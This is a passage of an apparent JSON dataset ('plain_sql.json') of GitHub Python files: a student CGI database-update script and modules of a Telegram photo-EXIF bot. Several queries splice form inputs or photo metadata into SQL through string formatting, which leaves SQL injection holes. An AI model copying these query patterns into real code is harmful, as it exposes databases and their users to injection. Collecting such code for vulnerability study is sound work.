= '%s'\" % (goal, process_name2)\n    query2 = \"select * from process where process_name = '%s'\" % process_name2\n\nif inter and conc:\n    query = \"update intermediate set concenration = '%s' where intermediate_name = '%s'\" % (conc, inter)\n    query2 = \"select * from intermediate where intermediate_name = '%s'\" % inter\n\nif process_name3 and enzyme_name3:\n    query = \"update uses set enzyme_name = '%s' where process_name = '%s'\" % (enzyme_name3, process_name3)\n    query2 = \"select * from uses where process_name = '%s' and enzyme_name = '%s'\" % (process_name3, enzyme_name3)\n\nif enzyme_name4 and organelle and sub and sub4:\n    query = \"update located_in set organelle = '%s', substructure = '%s' where enzyme_name = '%s' and substructure = '%s'\" % (organelle, sub, enzyme_name4, sub4)\n    query2 = \"select * from located_in where enzyme_name = '%s'\" % enzyme_name4\n    \nif organelle2 and sub2:\n    query = \"update location set substructure = '%s' where organelle = '%s' and substructure = '%s'\" % (sub2, organelle2, sub3)\n    query2 = \"select * from location where organelle = '%s' and substructure = '%s'\" % (organelle2, sub2)\n\nif conc2 and comp and loc:\n    query = \"update conds set prime_location = '%s' where concentration = '%s' and compound = '%s'\" % (loc, conc2, comp)\n    query2 = \"select * from conds where concentration = '%s' and compound = '%s' and prime_location = '%s'\" % (conc2, comp, loc)\n\n\nhasError = False\nif not query: # blank form - give the user option to go back or to the home page\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    hasError = True\n\nif query: # errors\n    try:\n        cursor.execute(query)\n        cnx.commit()\n\n    except mysql.connector.Error as err:\n        beghtml()\n        print(\"Something went wrong: {}\".format(err) + \"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n        print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n        endhtml()\n        hasError = True\n        \n# if there were no errors when executing the first query, continue executing the second\nif hasError == False:\n    cursor.execute(query2)\n    data = cursor.fetchall()\n    \n    # html with the response from the update           \n    beghtml()\n    \n    # if the first query did not come up with an error but the second did (typo, value not in the table)\n    # i.e. the select statement came up with nothing..\n    # print that something went wrong and give an option to go back\n    if not data:\n        print(\"<h3><b>Something went wrong </b></h3>\")\n        print(\"<b>Check your spelling!</b><br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n        print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    # otherwise, you want to print out what the database not reads\n    else:\n        print(\"<h3>Updated!</h3>\")\n        print(\"The database now reads <br><br>\")\n        for result in data[0]:\n            print(\"<b> | %s\" % result)\n        print(\" | </b>\")\n        print(\"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py\">Current Database</a></b><br><br>')\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/update.html\">Back</a></b>')\n    endhtml()\n\n\ncursor.close()\ncnx.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/RandyRomero/photoGPSbot/blob/5de0a4d1881825eca1b39b9d95a9a3218af15487",
        "file_path": "/photogpsbot/__main__.py",
        "source": "\"\"\"\nSmall bot for Telegram that receives your photo and returns you map where\nit was taken.\nWritten by Aleksandr Mikheev.\nhttps://github.com/RandyRomero/photogpsbot\n\nThis specific module contains methods to respond user messages, to make\ninteractive menus, to handle user language, to process user images\n\"\"\"\n\n# todo fix database queries in order to user parameters binding!\n\n# todo check what is wrong with geopy on\n#  last versions (some deprecation warning)\n\n# todo rewrite the processing of images\n# todo update docstrings and comments\n\nfrom io import BytesIO\nfrom datetime import datetime, timedelta\n\nfrom telebot import types\nimport requests\n\nfrom photogpsbot import bot, log, log_files, db, User, users, messages, machine\nfrom photogpsbot.process_image import ImageHandler\nfrom photogpsbot.db_connector import DatabaseConnectionError\nimport config\n\n\nclass PhotoMessage:\n    def __init__(self, message, user):\n        self.message = message\n        self.user = user\n        self.image_handler = ImageHandler\n\n    @staticmethod\n    def open_photo(message):\n        # Get temporary link to a photo that user sends to the bot\n        file_path = bot.get_file(message.document.file_id).file_path\n\n        # Download photo that got the bot from a user\n        link = (\"https://api.telegram.org/file/\"\n                f\"bot{config.TELEGRAM_TOKEN}/{file_path}\")\n\n        if machine == 'prod':\n            r = requests.get(link)\n        else:\n            # use proxy if the bot is running not on production server\n            proxies = {'https': config.PROXY_CONFIG}\n            r = requests.get(link, proxies=proxies)\n\n        # Get file-like object of user's photo\n        return BytesIO(r.content)\n\n    def get_info(self):\n        \"\"\"\n        Opens file that user sent as a file-like object, get necessary info\n        from it and return it\n\n        :return: instance of ImageData - my dataclass for storing info about\n        an image like user, date, camera name etc\n        \"\"\"\n        user_photo = self.open_photo(self.message)\n        image = self.image_handler(self.user, user_photo)\n        return image.get_image_info()\n\n    def save_info_to_db(self, image_data):\n        \"\"\"\n           When user send photo as a file to get information, bot also stores\n           information about this query to the database to keep statistics that\n           can be shown to a user in different ways. It stores time of query,\n           Telegram id of a user, his camera and lens which were used for\n           taking photo, his first and last name, nickname and country where\n           the photo was taken. The bot does not save photos or their\n           coordinates.\n\n           :image_data: an instance of ImageData dataclass with info about\n           the image\n           :return: None\n           \"\"\"\n        camera_name, lens_name = image_data.camera, image_data.lens\n        camera_name = f'\"{camera_name}\"' if camera_name else None\n        lens_name = f'\"{lens_name}\"' if lens_name else None\n\n        if not image_data.country:\n            country_en = country_ru = None\n        else:\n            country_en = f'\"{image_data.country[\"en-US\"]}\"'\n            country_ru = f'\"{image_data.country[\"ru-RU\"]}\"'\n\n        log.info('Adding user query to photo_queries_table...')\n\n        query = ('INSERT INTO photo_queries_table '\n                 '(chat_id, camera_name, lens_name, country_en, country_ru) '\n                 'VALUES (%s, %s, %s, %s, %s)')\n\n        parameters = (self.user.chat_id, camera_name, lens_name, country_en,\n                      country_ru)\n\n        db.execute_query(query, parameters)\n        db.conn.commit()\n        log.info('User query was successfully added to the database.')\n\n    @staticmethod\n    def find_num_users_with_same_feature(image_data):\n        same_feature = []\n\n        feature_types = ('camera_name', 'lens_name', 'country_en')\n        features = (image_data.camera, image_data.lens, image_data.country['en-US'])\n\n        for feature_name, feature in zip(feature_types, features):\n            if not feature:\n                same_feature.append(0)\n                continue\n            answer = get_number_users_by_feature(feature, feature_name)\n            same_feature.append(answer)\n\n        return same_feature\n\n    def prepare_answer(self):\n        \"\"\"\n        Process an image that user sent, get info from it, save data to the\n        database, make an answer to be sent via Telegram\n        :return:\n        \"\"\"\n\n        # Get instance of the dataclass ImageData with info about the image\n        image_data = self.get_info()\n        # Save some general info about the user's query to the database\n        self.save_info_to_db(image_data)\n\n        answer = ''\n        coordinates = image_data.latitude, image_data.longitude\n        if not coordinates[0]:\n            answer += messages[self.user.language][\"no_gps\"]\n\n        answ_template = messages[self.user.language][\"camera_info\"]\n        basic_data = (image_data.date_time, image_data.camera, image_data.lens,\n                      image_data.address[self.user.language])\n\n        # Concatenate templates in language that user prefer with information\n        # from the photo, for example: f'{\"Camera brand\"}:{\"Canon 60D\"}'\n        for arg in zip(answ_template, basic_data):\n            if arg[1]:\n                answer += f'*{arg[0]}*: {arg[1]}\\n'\n\n        lang = self.user.language\n        lang_templates = messages[lang][\"users with the same feature\"].values()\n        ppl_wth_same_featrs = self.find_num_users_with_same_feature(image_data)\n        for template, feature in zip(lang_templates, ppl_wth_same_featrs):\n            if feature:\n                answer += f'{template} {feature}\\n'\n\n        return coordinates, answer\n\n\ndef get_admin_stat(command):\n    # Function that returns statistics to admin by command\n    error_answer = \"Can't execute your command. Check logs\"\n    answer = 'There is some statistics for you: \\n'\n\n    # Set to a beginning of the day\n    today = (datetime\n             .today()\n             .replace(hour=0, minute=0, second=0, microsecond=0)\n             .strftime('%Y-%m-%d %H:%M:%S'))\n\n    # Last users with date of last time when they used bot\n    if command == 'last active users':\n\n        try:\n            last_active_users = users.get_last_active_users(100)\n        except DatabaseConnectionError:\n            return error_answer\n\n        bot_users = ''\n        # Makes a human readable list of last active users\n        for usr, index in zip(last_active_users,\n                              range(len(last_active_users))):\n            user = User(*usr)\n            bot_users += f'{index + 1}. {user}\\n'\n\n        answer = ('Up to 100 last active users by the time when they sent '\n                  'picture last time:\\n')\n        answer += bot_users\n        log.info('Done.')\n        return answer\n\n    elif command == 'total number photos sent':\n        log.info('Evaluating total number of photo queries in database...')\n        query = ('SELECT COUNT(chat_id) '\n                 'FROM photo_queries_table2')\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            return error_answer\n        answer += '{} times users sent photos.'.format(cursor.fetchone()[0])\n        query = ('SELECT COUNT(chat_id) '\n                 'FROM photo_queries_table2 '\n                 'WHERE chat_id !={}'.format(config.MY_TELEGRAM))\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            answer += (\"\\nCannot calculate number of photos that were send \"\n                       \"excluding your photos. Check logs\")\n            return answer\n\n        answer += '\\nExcept you: {} times.'.format(cursor.fetchone()[0])\n        log.info('Done.')\n        return answer\n\n    elif command == 'photos today':\n        # Show how many photos have been sent since 00:00:00 of today\n        log.info('Evaluating number of photos which were sent today.')\n        query = (\"SELECT COUNT(chat_id) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > '{}'\".format(today))\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            return error_answer\n        answer += f'{cursor.fetchone()[0]} times users sent photos today.'\n        query = (\"SELECT COUNT(chat_id) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > '{}' \"\n                 \"AND chat_id !={}\".format(today, config.MY_TELEGRAM))\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            return error_answer\n\n        answer += '\\nExcept you: {} times.'.format(cursor.fetchone()[0])\n        log.info('Done.')\n        return answer\n\n    elif command == 'number of users':\n        # Show number of users who has used bot at leas\"\n        # once or more (first for the whole time, then today)\n        log.info('Evaluating number of users that use bot '\n                 'since the first day and today...')\n        try:\n            num_of_users = users.get_total_number()\n        except DatabaseConnectionError:\n            return error_answer\n\n        answer += f'There are totally {num_of_users} users.'\n\n        query = (\"SELECT COUNT(DISTINCT chat_id) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > '{}'\".format(today))\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            answer += (\"\\nCannot calculate how many user have sent their \"\n                       \"photos today\")\n            return answer\n\n        answer += f'\\n{cursor.fetchone()[0]} users have sent photos today.'\n        log.info('Done.')\n        return answer\n\n    elif command == 'number of gadgets':\n        # To show you number smartphones + cameras in database\n        log.info('Evaluating number of cameras and smartphones in database...')\n        query = ('SELECT COUNT(DISTINCT camera_name) '\n                 'FROM photo_queries_table2')\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            return error_answer\n        answer += (f'There are totally {cursor.fetchone()[0]} '\n                   f'cameras/smartphones.')\n        query = (\"SELECT COUNT(DISTINCT camera_name) \"\n                 \"FROM photo_queries_table2 \"\n                 \"WHERE time > '{}'\".format(today))\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            answer += (\"Cannot calculate the number of gadgets that have been \"\n                       \"used today so far\")\n            return answer\n\n        answer += (f'\\n{cursor.fetchone()[0]} cameras/smartphones '\n                   'were used today.')\n        log.info('Done.')\n        return answer\n\n    elif command == 'uptime':\n        fmt = 'Uptime: {} days, {} hours, {} minutes and {} seconds.'\n        td = datetime.now() - bot.start_time\n        # datetime.timedelta.seconds returns you total number of seconds\n        # since given time, so you need to perform\n        # a little bit of math to make whole hours, minutes and seconds from it\n        # And there isn't any normal way to do it in Python unfortunately\n        uptime = fmt.format(td.days, td.seconds // 3600, td.seconds % 3600 //\n                            60, td.seconds % 60)\n        log.info(uptime)\n        return uptime\n\n\n@bot.message_handler(commands=['start'])\ndef create_main_keyboard(message):\n    user = users.find_one(message)\n    current_user_lang = user.language\n    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True,\n                                       resize_keyboard=True)\n    markup.row('/English')\n    markup.row(messages[current_user_lang]['top_cams'])\n    markup.row(messages[current_user_lang]['top_lens'])\n    markup.row(messages[current_user_lang]['top_countries'])\n    bot.send_message(user.chat_id, messages[current_user_lang]['menu_header'],\n                     reply_markup=markup)\n\n\n# Decorator to handle text messages\n@bot.message_handler(content_types=['text'])\ndef handle_menu_response(message):\n    # keyboard_hider = telebot.types.ReplyKeyboardRemove()\n    current_user_lang = users.find_one(message).language\n    user = users.find_one(message)\n\n    if message.text == '/English':\n\n        new_lang = users.find_one(message).switch_language()\n        if current_user_lang != new_lang:\n            bot.send_message(user.chat_id, messages[new_lang]\n                             ['switch_lang_success'])\n            create_main_keyboard(message)\n        else:\n            bot.send_message(user.chat_id, messages[new_lang]\n                             ['switch_lang_failure'])\n            create_main_keyboard(message)\n\n    elif message.text == messages[current_user_lang]['top_cams']:\n        log.info('User %s asked for top cams', user)\n        bot.send_message(user.chat_id,\n                         text=get_most_popular_items('camera_name', message))\n        log.info('List of most popular cameras '\n                 'has been returned to %s', user)\n\n        # in order not to check whether user has changed his nickname or\n        # whatever every time his sends any request the bot will just check\n        # it every time a user wants to get a statistic about the most\n        # popular cameras\n        users.compare_and_update(user, message)\n\n    elif message.text == messages[current_user_lang]['top_lens']:\n        log.info('User %s asked for top lens', user)\n        bot.send_message(user.chat_id,\n                         text=get_most_popular_items('lens_name',\n                                                     message))\n        log.info('List of most popular lens has been returned to %s', user)\n\n    elif message.text == messages[current_user_lang]['top_countries']:\n        log.info('User %s asked for top countries', user)\n        lang_table_name = ('country_ru'\n                           if current_user_lang == 'ru-RU'\n                           else 'country_en')\n        bot.send_message(user.chat_id,\n                         text=get_most_popular_items(lang_table_name, message))\n        log.info('List of most popular countries has '\n                 'been returned to %s', user)\n\n    elif (message.text.lower() == 'admin' and\n          user.chat_id == int(config.MY_TELEGRAM)):\n        # Creates inline keyboard with options for admin Function that handle\n        # user interaction with the keyboard called admin_menu\n\n        keyboard = types.InlineKeyboardMarkup()  # Make keyboard object\n        button = types.InlineKeyboardButton  # just an alias to save space\n\n        keyboard.add(button(text='Turn bot off', callback_data='off'))\n        keyboard.add(button(text='Last active users',\n                            callback_data='last active'))\n        keyboard.add(button(text='Total number of photos were sent',\n                            callback_data='total number photos sent'))\n        keyboard.add(button(text='Number of photos today',\n                            callback_data='photos today'))\n        keyboard.add(button(text='Number of users',\n                            callback_data='number of users'))\n        keyboard.add(button(text='Number of gadgets',\n                            callback_data='number of gadgets'))\n        keyboard.add(button(text='Uptime', callback_data='uptime'))\n        bot.send_message(config.MY_TELEGRAM,\n                         'Admin commands', reply_markup=keyboard)\n\n    else:\n        log.info('%s sent text message.', user)\n\n        # Answer to user that bot can't make a conversation with him\n        bot.send_message(user.chat_id,\n                         messages[current_user_lang]['dont_speak'])\n\n\n@bot.callback_query_handler(func=lambda call: True)\ndef admin_menu(call):  # Respond commands from admin menu\n    # Remove progress bar from pressed button\n    bot.answer_callback_query(callback_query_id=call.id, show_alert=False)\n\n    if call.data == 'off':\n        if db.disconnect():\n            bot.turn_off()\n        else:\n            log.error('Cannot stop bot.')\n            bot.send_message(chat_id=config.MY_TELEGRAM,\n                             text='Cannot stop bot.')\n    elif call.data == 'last active':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('last active users'))\n    elif call.data == 'total number photos sent':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('total number photos sent'))\n    elif call.data == 'photos today':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('photos today'))\n    elif call.data == 'number of users':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('number of users'))\n    elif call.data == 'number of gadgets':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('number of gadgets'))\n    elif call.data == 'uptime':\n        bot.send_message(config.MY_TELEGRAM,\n                         text=get_admin_stat('uptime'))\n\n\n@bot.message_handler(content_types=['photo'])\ndef answer_photo_message(message):\n    user = users.find_one(message)\n    bot.send_message(user.chat_id, messages[user.language]['as_file'])\n    log.info('%s sent photo as a photo.', user)\n\n\ndef cache_number_users_with_same_feature(func):\n    # Closure to cache previous results of given\n    # function so to not call database to much\n    # It saves result in a dictionary because result depends on a user.\n    # cache_time - time in minutes when will\n    # be returned cached result instead of calling database\n\n    when_was_called = None\n    result = {}\n\n    def func_launcher(feature, feature_type):\n        nonlocal result\n        nonlocal when_was_called\n        cache_time = 5\n\n        # It's high time to reevaluate result instead\n        # of just looking up in cache if countdown went off, if\n        # function has not been called yet, if result for\n        # feature (like camera, lens or country) not in cache\n        high_time = (when_was_called + timedelta(minutes=cache_time) <\n                     datetime.now() if when_was_called else True)\n\n        if not when_was_called or high_time or feature not in result:\n            when_was_called = datetime.now()\n            num_of_users = func(feature, feature_type)\n            result[feature] = num_of_users\n            return num_of_users\n        else:\n            log.info('Returning cached result of %s',  func.__name__)\n            time_left = (when_was_called + timedelta(minutes=cache_time) -\n                         datetime.now())\n            log.debug('Time to to reevaluate result of %s is %s',\n                      func.__name__, str(time_left)[:-7])\n            return result[feature]\n\n    return func_launcher\n\n\ndef cache_most_popular_items(func):\n    \"\"\"\n    Function that prevent calling any given function more often that once in\n    a cache_time. It calls given function, then during next cache\n    return func_launcher_time it\n    will return cached result of a given function. Function call given\n    function when: it hasn't been called before; cache_time is passed,\n    user ask result in another language.\n\n    :param func: some expensive function that we don't want to call too often\n    because it can slow down the script\n    :return: wrapper that figure out when to call function and when to\n    return cached result\n    \"\"\"\n    # store time when given function was called last time\n    when_was_called = None\n    # dictionary to store result where language of user\n    # is key and message for user is a value\n    result = {}\n\n    def function_launcher(item_type, message):\n        nonlocal func\n        nonlocal result\n        nonlocal when_was_called\n        cache_time = 5\n\n        # Only top countries can be returned in different languages.\n        # For the other types of queries it doesn't mean a thing.\n        if item_type == 'country_ru' or item_type == 'country_en':\n            result_id = users.find_one(message).language + item_type\n        else:\n            result_id = item_type\n\n        # evaluate boolean whether it is high time to call given function or\n        # not\n        high_time = (when_was_called + timedelta(minutes=cache_time) <\n                     datetime.now() if when_was_called else True)\n\n        if not result.get(result_id, None) or not when_was_called or high_time:\n            when_was_called = datetime.now()\n            result[result_id] = func(item_type, message)\n            return result[result_id]\n        else:\n            log.debug('Return cached result of %s...', func.__name__)\n            time_left = (when_was_called + timedelta(minutes=cache_time) -\n                         datetime.now())\n            log.debug('Time to reevaluate result of %s is %s',\n                      func.__name__, str(time_left)[:-7])\n            return result[result_id]\n\n    return function_launcher\n\n\n@cache_most_popular_items\ndef get_most_popular_items(item_type, message):\n    \"\"\"\n    Get most common cameras/lenses/countries from database and\n    make list of them\n    :param item_type: string with column name to choose between cameras,\n    lenses and countries\n    :param message: telebot object with info about user and his message\n    :return: string which is either list of most common\n    cameras/lenses/countries or message which states that list is\n    empty\n    \"\"\"\n\n    user = users.find_one(message)\n\n    def list_to_ordered_str_list(list_of_gadgets):\n        # Make Python list to be string like roster with indexes and\n        # new line characters like:\n        # 1. Canon 80D\n        # 2. iPhone 4S\n\n        string_roaster = ''\n        index = 1\n        for item in list_of_gadgets:\n            if not item[0]:\n                continue\n            string_roaster += '{}. {}\\n'.format(index, item[0])\n            index += 1\n        return string_roaster\n\n    log.debug('Evaluating most popular things...')\n\n    # This query returns item types in order where the first one item\n    # has the highest number of occurrences\n    # in a given column\n    query = ('SELECT {0} FROM photo_queries_table2 '\n             'GROUP BY {0} '\n             'ORDER BY count({0}) '\n             'DESC'.format(item_type))\n    try:\n        cursor = db.execute_query(query)\n    except DatabaseConnectionError:\n        log.error(\"Can't evaluate a list of the most popular items\")\n        return messages[user.language]['doesnt work']\n\n    # Almost impossible case but still\n    if not cursor.rowcount:\n        log.warning('There is nothing in the main database table')\n        bot.send_message(chat_id=config.MY_TELEGRAM,\n                         text='There is nothing in the main database table')\n        return messages[user.language]['no_top']\n\n    popular_items = cursor.fetchall()\n    log.info('Finish evaluating the most popular items')\n    return list_to_ordered_str_list(popular_items[:30])\n\n\n@cache_number_users_with_same_feature\ndef get_number_users_by_feature(feature, feature_type):\n    \"\"\"\n    Get number of users that have same smartphone, camera, lens or that\n    have been to the same country\n    :param feature: string which is name of a particular feature e.g.\n    camera name or country name\n    :param feature_type: string which is name of the column in database\n    :param message: telebot object with info about message and its sender\n    :return: string which is message to user\n    \"\"\"\n    log.debug('Check how many users also have this feature: %s...',\n              feature)\n\n    query = (\"SELECT DISTINCT chat_id \"\n             \"FROM photo_queries_table2 \"\n             \"WHERE {}='{}'\".format(feature_type, feature))\n    try:\n        cursor = db.execute_query(query)\n    except DatabaseConnectionError:\n        log.error(\"Cannot check how many users also have this feature: %s...\",\n                  feature)\n        return None\n\n    if not cursor.rowcount:\n        log.debug('There were no users with %s...', feature)\n        return None\n\n    log.debug('There is %d users with %s', cursor.rowcount, feature)\n    return cursor.rowcount - 1\n\n\n@bot.message_handler(content_types=['document'])  # receive file\ndef handle_message_with_image(message):\n\n    user = users.find_one(message)\n    # Sending a message to a user that his photo is being processed\n    bot.reply_to(message, messages[user.language]['photo_prcs'])\n    log.info('%s sent photo as a file.', user)\n\n    photo_message = PhotoMessage(message, user)\n    answer = photo_message.prepare_answer()\n\n    # if longitude is in the answer\n    if answer[0][0]:\n        lon = answer[0][0]\n        lat = answer[0][1]\n        bot.send_location(user.chat_id, lon, lat, live_period=None)\n        bot.reply_to(message, answer[1], parse_mode='Markdown')\n    else:\n        bot.reply_to(message, answer, parse_mode='Markdown')\n\n\ndef main():\n    log_files.clean_log_folder(1)\n    users.cache(100)\n    db.connect()\n    bot.start_bot()\n\n\nif __name__ == '__main__':\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/RandyRomero/photoGPSbot/blob/5de0a4d1881825eca1b39b9d95a9a3218af15487",
        "file_path": "/photogpsbot/db_connector.py",
        "source": "\"\"\"\nModule that provides a way to connect to MySQL and reconnect each time\nconnection is lost. It also can automatically set up SSH tunnel thanks to\nsshtunnel module\n\nOriginal way to do it was described at\nhttps://help.pythonanywhere.com/pages/ManagingDatabaseConnections/\n\"\"\"\n\nimport socket\n\n# goes as mysqlclient in requirements\nimport MySQLdb\nimport sshtunnel\n\nfrom photogpsbot import log\nimport config\n\n\nclass DatabaseError(Exception):\n    pass\n\n\nclass DatabaseConnectionError(Exception):\n    pass\n\n\nclass Database:\n    \"\"\"\n    Class that provides method to execute queries and handles connection to\n    the MySQL database directly and via ssh if necessary\n    \"\"\"\n    conn = None\n    tunnel = None\n    tunnel_opened = False\n\n    def _open_ssh_tunnel(self):\n        \"\"\"\n        Method that opens ssh tunnel to the server where the database of\n        photogpsbot is located\n        :return: None\n        \"\"\"\n        log.debug('Establishing SSH tunnel to the server where the database '\n                  'is located...')\n        sshtunnel.SSH_TIMEOUT = 5.0\n        sshtunnel.TUNNEL_TIMEOUT = 5.0\n        self.tunnel = sshtunnel.SSHTunnelForwarder(\n            ssh_address_or_host=config.SERVER_ADDRESS,\n            ssh_username=config.SSH_USER,\n            ssh_password=config.SSH_PASSWD,\n            ssh_port=22,\n            remote_bind_address=('127.0.0.1', 3306))\n\n        self.tunnel.start()\n        self.tunnel_opened = True\n        log.debug('SSH tunnel has been established.')\n\n    def connect(self):\n        \"\"\"\n        Established connection either to local database or to remote one if\n        the script runs not on the same server where database is located\n        :return: None\n        \"\"\"\n        if socket.gethostname() == config.PROD_HOST_NAME:\n            log.info('Connecting to the local database...')\n            port = 3306\n        else:\n            log.info('Connecting to the database via SSH...')\n            if not self.tunnel_opened:\n                self._open_ssh_tunnel()\n\n            port = self.tunnel.local_bind_port\n\n        self.conn = MySQLdb.connect(host='127.0.0.1',\n                                    user=config.DB_USER,\n                                    password=config.DB_PASSWD,\n                                    port=port,\n                                    database=config.DB_NAME,\n                                    charset='utf8')\n        log.info('Connected to the database.')\n\n    def execute_query(self, query, parameters=None, trials=0):\n        \"\"\"\n        Executes a given query\n        :param query: query to execute\n        :param trials: integer that denotes number of trials to execute\n        a query in case of known errors\n        :return: cursor object\n        \"\"\"\n        if not self.conn or not self.conn.open:\n            self.connect()\n\n        try:\n            cursor = self.conn.cursor()\n            cursor.execute(query, parameters)\n\n        # try to reconnect if MySQL server has gone away\n        except MySQLdb.OperationalError as e:\n\n            # (2013, Lost connection to MySQL server during query)\n            # (2006, Server has gone away)\n            if e.args[0] in [2006, 2013]:\n                log.info(e)\n                # log.debug(\"Connecting to the MySQL again...\")\n\n                self.connect()\n                if trials > 3:\n                    log.error(e)\n                    log.warning(\"Ran out of limit of trials...\")\n                    raise DatabaseConnectionError(\"Cannot connect to the \"\n                                                  \"database\")\n\n                trials += 1\n                # trying to execute query one more time\n                log.warning(e)\n                log.info(\"Trying execute the query again...\")\n                return self.execute_query(query, parameters, trials)\n            else:\n                log.error(e)\n                raise\n        except Exception as e:\n            log.error(e)\n            raise\n        else:\n            return cursor\n\n    def add(self, query):\n        \"\"\"\n        Shortcut to add something to a database\n        :param query: query to execute\n        :return: boolean - True if the method succeeded and False otherwise\n        \"\"\"\n\n        try:\n            self.execute_query(query)\n            self.conn.commit()\n        except Exception as e:\n            log.errror(e)\n            raise DatabaseError(\"Cannot add your data to the database!\")\n\n    def disconnect(self):\n        \"\"\"\n        Closes the connection to the database and ssh tunnel if needed\n        :return: True if succeeded\n        \"\"\"\n        if self.conn:\n            self.conn.close()\n            log.info('Connection to the database has been closed.')\n        if self.tunnel:\n            self.tunnel.stop()\n            log.info('SSH tunnel has been closed.')\n        self.tunnel_opened = False\n        return True\n\n    def __str__(self):\n        return (f'Instance of a connector to the database. '\n                f'The connection is {\"opened\" if self.conn else \"closed\"}. '\n                f'SSH tunnel is {\"opened\" if self.tunnel_opened else \"closed\"}'\n                '.')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/RandyRomero/photoGPSbot/blob/5de0a4d1881825eca1b39b9d95a9a3218af15487",
        "file_path": "/photogpsbot/process_image.py",
        "source": "from dataclasses import dataclass\nfrom typing import Dict\n\nimport exifread\nfrom exifread.classes import IfdTag\nfrom geopy.geocoders import Nominatim\n\nfrom photogpsbot import bot, log, db, User\n\n\nclass InvalidCoordinates(Exception):\n    \"\"\"\n    Coordinates have invalid format\n    \"\"\"\n\n\nclass NoCoordinates(Exception):\n    \"\"\"\n    There is no location info\n    \"\"\"\n\n\nclass NoEXIF(Exception):\n    \"\"\"\n    Means that there is no EXIF within the photo at all\n\n    \"\"\"\n\n\nclass NoData(Exception):\n    \"\"\"\n    Means that there is actually no any data of our interest within the picture\n\n    \"\"\"\n\n\n@dataclass\nclass ImageData:\n    \"\"\"\n    A class to store info about a photo from user.\n    \"\"\"\n    user: User\n    date_time: str = None\n    camera: str = None\n    lens: str = None\n    address: str = None\n    country: Dict[str, str] = None\n    latitude: float = None\n    longitude: float = None\n\n\n@dataclass\nclass RawImageData:\n    \"\"\"\n    Raw data from photo that is still have to be converted in order to be used.\n    \"\"\"\n    user: User\n    date_time: str = None\n    camera_brand: str = None\n    camera_model: str = None\n    lens_brand: str = None\n    lens_model: str = None\n    latitude_reference: str = None\n    raw_latitude: IfdTag = None\n    longitude_reference: str = None\n    raw_longitude: IfdTag = None\n\n\nclass ImageHandler:\n\n    def __init__(self, user, file):\n        self.user = user\n        self.file = file\n        self.raw_data = None\n\n    @staticmethod\n    def _get_raw_data(file):\n        \"\"\"\n        Get name of the camera and lens, the date when the photo was taken\n        and raw coordinates (which later will be converted)\n        :param file: byte sting with an image\n        :return: RawImageData object with raw info from the photo\n        \"\"\"\n        # Get data from the exif of the photo via external library\n        exif = exifread.process_file(file, details=False)\n        if not len(exif.keys()):\n            reason = \"This picture doesn't contain EXIF.\"\n            log.info(reason)\n            raise NoEXIF(reason)\n\n        # Get info about camera ang lend from EXIF\n        date_time = exif.get('EXIF DateTimeOriginal', None)\n        date_time = str(date_time) if date_time else None\n        camera_brand = str(exif.get('Image Make', ''))\n        camera_model = str(exif.get('Image Model', ''))\n        lens_brand = str(exif.get('EXIF LensMake', ''))\n        lens_model = str(exif.get('EXIF LensModel', ''))\n\n        if not any([date_time, camera_brand, camera_model, lens_brand,\n                    lens_model]):\n            # Means that there is actually no any data of our interest\n            reason = 'There is no data of interest in this photo'\n            log.info(reason)\n            raise NoData(reason)\n\n        try:  # Extract coordinates from EXIF\n            latitude_reference = str(exif['GPS GPSLatitudeRef'])\n            raw_latitude = exif['GPS GPSLatitude']\n            longitude_reference = str(exif['GPS GPSLongitudeRef'])\n            raw_longitude = exif['GPS GPSLongitude']\n\n        except KeyError:\n            log.info(\"This picture doesn't contain coordinates.\")\n            # returning info about the photo without coordinates\n            return (date_time, camera_brand, camera_model,\n                    lens_brand, lens_model)\n        else:\n            # returning info about the photo with its coordinates\n            return (date_time, camera_brand, camera_model,\n                    lens_brand, lens_model, latitude_reference, raw_latitude,\n                    longitude_reference, raw_longitude)\n\n    @staticmethod\n    def _dedupe_string(string):\n        \"\"\"\n        Get rid of all repetitive words in a string\n        :param string: string with camera or lens names\n        :return: same string without repetitive words\n        \"\"\"\n\n        deduped_string = ''\n\n        for x in string.split(' '):\n            if x not in deduped_string:\n                deduped_string += x + ' '\n        return deduped_string.rstrip()\n\n    @staticmethod\n    def _check_camera_tags(tags):\n        \"\"\"\n        Function that convert stupid code name of a smartphone or camera\n        from EXIF to meaningful one by looking a collation in a special MySQL\n        table For example instead of just Nikon there can be\n        NIKON 